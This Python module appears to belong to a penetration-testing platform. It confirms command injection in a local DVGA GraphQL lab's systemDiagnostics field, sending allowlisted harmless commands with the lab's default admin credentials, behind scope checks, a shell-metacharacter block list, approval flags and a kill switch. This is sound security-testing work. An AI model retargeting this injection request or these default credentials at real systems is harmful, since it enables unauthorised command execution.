from __future__ import annotations

import json
import re
from hashlib import sha256
from typing import Any, Callable
from urllib.parse import urljoin, urlparse

import httpx as httpx_client

from api.app.services.runs import web_target_value_is_allowed_with_path
from workers.runners.base.contracts import EvidenceArtifact, RunnerExecution
from workers.runners.httpx.runner import normalize_http_target

GRAPHQL_COMMAND_INJECTION_RESULTS_ARTIFACT_NAME = (
    "graphql-command-injection-results.json"
)
TOOL_NAME = "graphql-command-injection"
AUTHORIZED_DVGA_ROOTS = ("http://127.0.0.1:5013/", "http://localhost:5013/")
DEFAULT_ENDPOINT_PATH = "/graphql"
DEFAULT_COMMAND = "echo aegispt-command-injection-proof"
DVGA_DIAGNOSTIC_USERNAME = "admin"
DVGA_DIAGNOSTIC_PASSWORD = "changeme"
ALLOWED_COMMANDS = (
    DEFAULT_COMMAND,
    "id",
    "whoami",
    "uname -a",
)
PROOF_MARKER = "aegispt-command-injection-proof"
OPERATION_NAME = "AegisPTCommandInjection"
SYSTEM_DIAGNOSTICS_QUERY = """
query AegisPTCommandInjection($cmd: String!, $username: String!, $password: String!) {
  systemDiagnostics(cmd: $cmd, username: $username, password: $password)
}
""".strip()
SHELL_METACHAR_RE = re.compile(r"[;&|`$<>\n\r]")


def _json_artifact(name: str, payload: dict[str, Any]) -> EvidenceArtifact:
    return EvidenceArtifact(
        name=name,
        content_type="application/json",
        data=(json.dumps(payload, sort_keys=True) + "\n").encode("utf-8"),
        kind="runner-results",
    )


def _response_hash(response: httpx_client.Response) -> str:
    return sha256(response.content).hexdigest()


def _excerpt(value: Any, *, limit: int = 700) -> str:
    text = re.sub(r"\s+", " ", str(value or "")).strip()
    return text[:limit]


def _normalize_local_dvga_root(raw_target: str) -> str:
    candidate = normalize_http_target(str(raw_target or "").strip())
    parsed = urlparse(candidate)
    if parsed.scheme != "http" or parsed.hostname not in {"127.0.0.1", "localhost"}:
        raise ValueError(
            "graphql-command-injection is restricted to the local DVGA lab root"
        )
    if parsed.port != 5013:
        raise ValueError(
            "graphql-command-injection is restricted to the local DVGA lab on port 5013"
        )
    if parsed.params or parsed.query or parsed.fragment:
        raise ValueError("graphql-command-injection target must not include params or query")
    normalized_path = parsed.path.rstrip("/") or "/"
    if normalized_path not in {"/", "/graphql"}:
        raise ValueError(
            "graphql-command-injection accepts only the local DVGA root or /graphql endpoint"
        )
    root = f"{parsed.scheme}://{parsed.netloc}/"
    if root not in AUTHORIZED_DVGA_ROOTS:
        raise ValueError("graphql-command-injection target root is not authorized")
    return root


def _normalize_targets(
    targets: list[str],
    scope_allowlist: dict[str, Any] | None,
) -> list[str]:
    normalized: list[str] = []
    seen: set[str] = set()
    for target in targets:
        root = _normalize_local_dvga_root(target)
        if not web_target_value_is_allowed_with_path(scope_allowlist or {}, root):
            raise ValueError(f"target outside approved GraphQL command-injection scope: {root}")
        if root not in seen:
            seen.add(root)
            normalized.append(root)
    if not normalized:
        raise ValueError("at least one local DVGA target is required")
    return normalized


def _normalize_endpoint_path(raw_path: str | None) -> str:
    path = str(raw_path or DEFAULT_ENDPOINT_PATH).strip() or DEFAULT_ENDPOINT_PATH
    if "://" in path:
        raise ValueError("graphql-command-injection endpoint_path must be relative")
    if not path.startswith("/"):
        path = f"/{path}"
    if path.rstrip("/") != "/graphql":
        raise ValueError("graphql-command-injection only supports the DVGA /graphql endpoint")
    return "/graphql"


def _normalize_command(
    command: str | None,
    allowed_commands: list[str] | tuple[str, ...] | None,
) -> str:
    configured = str(command or DEFAULT_COMMAND).strip()
    effective_allowlist = tuple(
        str(item).strip()
        for item in (allowed_commands or ALLOWED_COMMANDS)
        if isinstance(item, str) and str(item).strip()
    )
    if configured not in effective_allowlist:
        raise ValueError("graphql-command-injection command is not in the safe allowlist")
    if SHELL_METACHAR_RE.search(configured):
        raise ValueError("graphql-command-injection command contains blocked shell metacharacters")
    return configured


def _decode_json_response(response: httpx_client.Response) -> dict[str, Any] | None:
    try:
        payload = response.json()
    except ValueError:
        return None
    return payload if isinstance(payload, dict) else None


def _graphql_post(
    client: httpx_client.Client,
    endpoint_url: str,
    command: str,
) -> httpx_client.Response:
    return client.post(
        endpoint_url,
        json={
            "query": SYSTEM_DIAGNOSTICS_QUERY,
            "operationName": OPERATION_NAME,
            "variables": {
                "cmd": command,
                "username": DVGA_DIAGNOSTIC_USERNAME,
                "password": DVGA_DIAGNOSTIC_PASSWORD,
            },
        },
        headers={
            "Accept": "application/json",
            "Content-Type": "application/json",
            "User-Agent": "AegisPT/graphql-command-injection local-lab",
        },
    )


def _extract_system_diagnostics(payload: dict[str, Any] | None) -> str:
    if not isinstance(payload, dict):
        return ""
    data = payload.get("data")
    if not isinstance(data, dict):
        return ""
    value = data.get("systemDiagnostics")
    return str(value or "")


def execute_graphql_command_injection(
    targets: list[str],
    *,
    scope_allowlist: dict[str, Any] | None = None,
    endpoint_path: str | None = DEFAULT_ENDPOINT_PATH,
    command: str | None = DEFAULT_COMMAND,
    allowed_commands: list[str] | tuple[str, ...] | None = None,
    intrusive_authorized: bool = False,
    allow_command_injection_proof: bool = False,
    kill_switch_enabled: bool = False,
    timeout_seconds: float = 10.0,
    client_factory: Callable[..., httpx_client.Client] | None = None,
) -> RunnerExecution:
    if kill_switch_enabled:
        raise ValueError("graphql-command-injection blocked by execution kill switch")
    if not intrusive_authorized or not allow_command_injection_proof:
        raise ValueError(
            "graphql-command-injection requires explicit intrusive command-injection approval"
        )
    if timeout_seconds <= 0:
        raise ValueError("timeout_seconds must be greater than zero")

    normalized_targets = _normalize_targets(targets, scope_allowlist)
    normalized_endpoint_path = _normalize_endpoint_path(endpoint_path)
    normalized_command = _normalize_command(command, allowed_commands)
    command_hash = sha256(normalized_command.encode("utf-8")).hexdigest()

    checks: list[dict[str, Any]] = []
    findings: list[dict[str, Any]] = []
    stderr_lines: list[str] = []
    exit_code = 0

    factory = client_factory or httpx_client.Client
    with factory(timeout=timeout_seconds, follow_redirects=False) as client:
        for root in normalized_targets:
            endpoint_url = urljoin(root, normalized_endpoint_path.lstrip("/"))
            if not web_target_value_is_allowed_with_path(scope_allowlist or {}, endpoint_url):
                raise ValueError(
                    f"GraphQL command-injection endpoint outside approved scope: {endpoint_url}"
                )
            try:
                response = _graphql_post(client, endpoint_url, normalized_command)
            except httpx_client.HTTPError as exc:
                exit_code = 1
                stderr_lines.append(
                    f"GraphQL command-injection proof failed for {endpoint_url}: {exc}"
                )
                checks.append(
                    {
                        "check_type": "dvga_system_diagnostics_command_injection",
                        "target": endpoint_url,
                        "authorized_root": root,
                        "status": "transport_error",
                        "error_excerpt": _excerpt(exc),
                        "command_sha256": command_hash,
                    }
                )
                continue

            response_payload = _decode_json_response(response)
            diagnostic_output = _extract_system_diagnostics(response_payload)
            errors = response_payload.get("errors") if isinstance(response_payload, dict) else None
            error_excerpt = _excerpt(errors) if errors else ""
            confirmed = (
                response.status_code < 500
                and bool(diagnostic_output.strip())
                and (PROOF_MARKER in diagnostic_output or normalized_command != DEFAULT_COMMAND)
                and not errors
            )
            check = {
                "check_type": "dvga_system_diagnostics_command_injection",
                "target": endpoint_url,
                "authorized_root": root,
                "status_code": response.status_code,
                "confirmed": confirmed,
                "operation_name": OPERATION_NAME,
                "field": "systemDiagnostics",
                "argument": "cmd",
                "credential_context": "dvga-default-local-lab-admin",
                "username": DVGA_DIAGNOSTIC_USERNAME,
                "password_stored": False,
                "command_allowlist_entry": normalized_command,
                "command_sha256": command_hash,
                "response_hash": _response_hash(response),
                "output_excerpt": _excerpt(diagnostic_output),
                "error_excerpt": error_excerpt,
                "cleanup_status": "not_required_no_state_change",
            }
            checks.append(check)

            if confirmed:
                findings.append(
                    {
                        "type": "graphql_command_injection_confirmed",
                        "title": "DVGA GraphQL Command Injection Confirmed",
                        "severity": "critical",
                        "target": endpoint_url,
                        "summary": (
                            "The local DVGA GraphQL systemDiagnostics field executed an "
                            "allowlisted harmless operating-system command in the approved lab."
                        ),
                        "confirmed": True,
                        "methodology_tags": [
                            "api_security",
                            "graphql_security",
                            "owasp-api-top-10-2023",
                            "graphql-command-injection-validation",
                            "intrusive-local-lab",
                        ],
                        "control_family": "api_security",
                        "evidence": {
                            "probe": "dvga-systemDiagnostics-command-injection",
                            "authorized_root": root,
                            "operation_name": OPERATION_NAME,
                            "field": "systemDiagnostics",
                            "argument": "cmd",
                            "credential_context": "dvga-default-local-lab-admin",
                            "username": DVGA_DIAGNOSTIC_USERNAME,
                            "password_stored": False,
                            "command_allowlist_entry": normalized_command,
                            "command_sha256": command_hash,
                            "status_code": response.status_code,
                            "response_hash": _response_hash(response),
                            "output_excerpt": _excerpt(diagnostic_output),
                            "cleanup_status": "not_required_no_state_change",
                        },
                        "replay_recipe": {
                            "tool": TOOL_NAME,
                            "target": root,
                            "endpoint_path": normalized_endpoint_path,
                            "operation_name": OPERATION_NAME,
                            "field": "systemDiagnostics",
                            "argument": "cmd",
                            "credential_context": "dvga-default-local-lab-admin",
                            "username": DVGA_DIAGNOSTIC_USERNAME,
                            "password_stored": False,
                            "command_allowlist_entry": normalized_command,
                            "scope": "local-dvga-lab-only",
                            "intrusive_approval_required": True,
                            "destructive_actions": False,
                            "file_write": False,
                            "network_callback": False,
                            "credential_access": False,
                        },
                    }
                )

    payload = {
        "tool": TOOL_NAME,
        "targets": normalized_targets,
        "authorized_roots": list(AUTHORIZED_DVGA_ROOTS),
        "endpoint_path": normalized_endpoint_path,
        "checks": checks,
        "findings": findings,
        "summary": {
            "target_count": len(normalized_targets),
            "check_count": len(checks),
            "finding_count": len(findings),
            "confirmed_command_injection_count": sum(
                1 for item in checks if item.get("confirmed") is True
            ),
        },
        "request_summary": {
            "method": "POST",
            "operation_name": OPERATION_NAME,
            "field": "systemDiagnostics",
            "argument": "cmd",
            "variables": ["cmd", "username", "password"],
            "credential_context": "dvga-default-local-lab-admin",
            "username": DVGA_DIAGNOSTIC_USERNAME,
            "password_stored": False,
            "command_allowlist_entry": normalized_command,
            "command_sha256": command_hash,
            "raw_shell_metacharacters_allowed": False,
        },
        "safety": {
            "scope_enforced": True,
            "local_dvga_lab_only": True,
            "intrusive_approval_required": True,
            "intrusive_authorized": intrusive_authorized,
            "allow_command_injection_proof": allow_command_injection_proof,
            "safe_command_allowlist_enforced": True,
            "allowed_commands": list(ALLOWED_COMMANDS),
            "arbitrary_shell": False,
            "reverse_shell": False,
            "file_write": False,
            "network_callback": False,
            "credential_access": False,
            "credential_attack": False,
            "credential_discovery": False,
            "dvga_default_lab_credentials_used": True,
            "password_stored": False,
            "persistence": False,
            "lateral_movement": False,
            "privilege_escalation": False,
            "generic_graphql_probe_changed": False,
            "cleanup_status": "not_required_no_state_change",
        },
    }
    status = "ok" if exit_code == 0 else "completed_with_errors"
    return RunnerExecution(
        tool=TOOL_NAME,
        exit_code=exit_code,
        stdout=json.dumps(payload["summary"], sort_keys=True),
        stderr="\n".join(line for line in stderr_lines if line),
        metadata={
            "status": status,
            "runner_digest": "workers.graphql_command_injection.runner:v1",
            "tool_version": "custom-python-dvga-local-lab",
            "finding_count": len(findings),
            "check_count": len(checks),
            "local_lab_only": True,
        },
        artifacts=[_json_artifact(GRAPHQL_COMMAND_INJECTION_RESULTS_ARTIFACT_NAME, payload)],
    )
